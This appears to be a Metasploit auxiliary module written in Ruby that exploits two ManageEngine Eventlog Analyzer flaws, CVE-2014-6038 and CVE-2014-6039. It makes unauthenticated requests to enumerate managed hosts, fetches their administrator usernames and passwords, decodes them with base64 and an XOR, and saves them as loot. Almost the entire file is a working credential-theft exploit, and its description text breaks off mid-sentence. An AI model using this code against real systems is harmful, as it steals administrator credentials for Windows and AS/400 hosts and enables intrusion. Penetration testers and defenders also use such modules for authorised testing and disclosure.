# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;msf/core&#039;
require &#039;rexml/document&#039;
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::HttpClient
include Msf::Auxiliary::Report
def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure&#039;,
&#039;Description&#039; => %q{
ManageEngine Eventlog Analyzer from v7 to v9.9 b9002 has two security vulnerabilities that
allow an unauthenticated user to obtain the superuser password of any managed Windows and
AS/400 hosts. This module abuses both vulnerabilities to collect all the available
usernames and passwords. First the agentHandler servlet is abused to get the hostid and
slid of each device (CVE-2014-6038); then these numeric id&#039;s are used to extract usernames
and passwords by abusing the hostdetails servlet (CVE-2014-6039). Note that on version 7
},
&#039;Author&#039; =>
[
&#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039; # Vulnerability discovery and MSF module
],
&#039;License&#039; => MSF_LICENSE,
&#039;References&#039; =>
[
[ &#039;CVE&#039;, &#039;2014-6038&#039; ],
[ &#039;CVE&#039;, &#039;2014-6039&#039; ],
[ &#039;OSVDB&#039;, &#039;114342&#039; ],
[ &#039;OSVDB&#039;, &#039;114344&#039; ],
[ &#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_eventlog_info_disc.txt&#039; ],
[ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2014/Nov/12&#039; ]
],
&#039;DisclosureDate&#039; => &#039;Nov 5 2014&#039;))
register_options(
[
Opt::RPORT(8400),
OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Eventlog Analyzer application URI (should be /event for version 7)&#039;, &#039;/&#039;]),
], self.class)
end
def decode_password(encoded_password)
password_xor = Rex::Text.decode_base64(encoded_password)
password = &#039;&#039;
password_xor.bytes.each do |byte|
password << (byte ^ 0x30)
end
return password
end
def run
res = send_request_cgi({
&#039;uri&#039; => normalize_uri(target_uri.path, &#039;agentHandler&#039;),
&#039;method&#039; =>&#039;GET&#039;,
&#039;vars_get&#039; => {
&#039;mode&#039; => &#039;getTableData&#039;,
&#039;table&#039; => &#039;HostDetails&#039;
}
})
unless res && res.code == 200
fail_with(Failure::NotFound, "#{peer} - Failed to reach agentHandler servlet")
return
end
# When passwords have digits the XML parsing will fail.
# Replace with an empty password attribute so that we know the device has a password
# and therefore we want to add it to our host list.
xml = res.body.to_s.gsub(/&#[0-9]*;/,Rex::Text.rand_text_alpha(6))
begin
doc = REXML::Document.new(xml)
rescue
fail_with(Failure::Unknown, "#{peer} - Error parsing the XML, dumping output #{xml}")
end
slid_host_ary = []
doc.elements.each(&#039;Details/HostDetails&#039;) do |ele|
if ele.attributes[&#039;password&#039;]
# If an element doesn&#039;t have a password, then we don&#039;t care about it.
# Otherwise store the slid and host_id to use later.
slid_host_ary << [ele.attributes[&#039;slid&#039;], ele.attributes[&#039;host_id&#039;]]
end
end
cred_table = Rex::Ui::Text::Table.new(
&#039;Header&#039; => &#039;ManageEngine EventLog Analyzer Managed Devices Credentials&#039;,
&#039;Indent&#039; => 1,
&#039;Columns&#039; =>
[
&#039;Host&#039;,
&#039;Type&#039;,
&#039;SubType&#039;,
&#039;Domain&#039;,
&#039;Username&#039;,
&#039;Password&#039;,
]
)
slid_host_ary.each do |host|
res = send_request_cgi({
&#039;uri&#039; => normalize_uri(target_uri.path, &#039;hostdetails&#039;),
&#039;method&#039; =>&#039;GET&#039;,
&#039;vars_get&#039; => {
&#039;slid&#039; => host[0],
&#039;hostid&#039; => host[1]
}
})
unless res && res.code == 200
fail_with(Failure::NotFound, "#{peer} - Failed to reach hostdetails servlet")
end
begin
doc = REXML::Document.new(res.body)
rescue
fail_with(Failure::Unknown, "#{peer} - Error parsing the XML, dumping output #{res.body.to_s}")
end
doc.elements.each(&#039;Details/Hosts&#039;) do |ele|
# Add an empty string if a variable doesn&#039;t exist, we have to check it
# somewhere and it&#039;s easier to do it here.
host_ipaddress = ele.attributes[&#039;host_ipaddress&#039;] || &#039;&#039;
ele.elements.each(&#039;HostDetails&#039;) do |details|
domain_name = details.attributes[&#039;domain_name&#039;] || &#039;&#039;
username = details.attributes[&#039;username&#039;] || &#039;&#039;
password_encoded = details.attributes[&#039;password&#039;] || &#039;&#039;
password = decode_password(password_encoded)
type = details.attributes[&#039;type&#039;] || &#039;&#039;
subtype = details.attributes[&#039;subtype&#039;] || &#039;&#039;
unless type =~ /Windows/ || subtype =~ /Windows/
# With AS/400 we get some garbage in the domain name even though it doesn&#039;t exist
domain_name = ""
end
msg = "Got login to #{host_ipaddress} | running "
msg << type << (subtype != &#039;&#039; ? " | #{subtype}" : &#039;&#039;)
msg << &#039; | username: &#039;
msg << (domain_name != &#039;&#039; ? "#{domain_name}\\#{username}" : username)
msg << " | password: #{password}"
print_good(msg)
cred_table << [host_ipaddress, type, subtype, domain_name, username, password]
if type == &#039;Windows&#039;
service_name = &#039;epmap&#039;
port = 135
elsif type == &#039;IBM AS/400&#039;
service_name = &#039;as-servermap&#039;
port = 449
else
next
end
credential_core = report_credential_core({
password: password,
username: username,
})
host_login_data = {
address: host_ipaddress,
service_name: service_name,
workspace_id: myworkspace_id,
protocol: &#039;tcp&#039;,
port: port,
core: credential_core,
status: Metasploit::Model::Login::Status::UNTRIED
}
create_credential_login(host_login_data)
end
end
end
print_line
print_line("#{cred_table}")
loot_name = &#039;manageengine.eventlog.managed_hosts.creds&#039;
loot_type = &#039;text/csv&#039;
loot_filename = &#039;manageengine_eventlog_managed_hosts_creds.csv&#039;
loot_desc = &#039;ManageEngine Eventlog Analyzer Managed Hosts Administrator Credentials&#039;
p = store_loot(
loot_name,
loot_type,
rhost,
cred_table.to_csv,
loot_filename,
loot_desc)
print_status "Credentials saved in: #{p}"
end
def report_credential_core(cred_opts={})
# Set up the has for our Origin service
origin_service_data = {
address: rhost,
port: rport,
service_name: (ssl ? &#039;https&#039; : &#039;http&#039;),
protocol: &#039;tcp&#039;,
workspace_id: myworkspace_id
}
credential_data = {
origin_type: :service,
module_fullname: self.fullname,
private_type: :password,
private_data: cred_opts[:password],
username: cred_opts[:username]
}
credential_data.merge!(origin_service_data)
create_credential(credential_data)
end
end

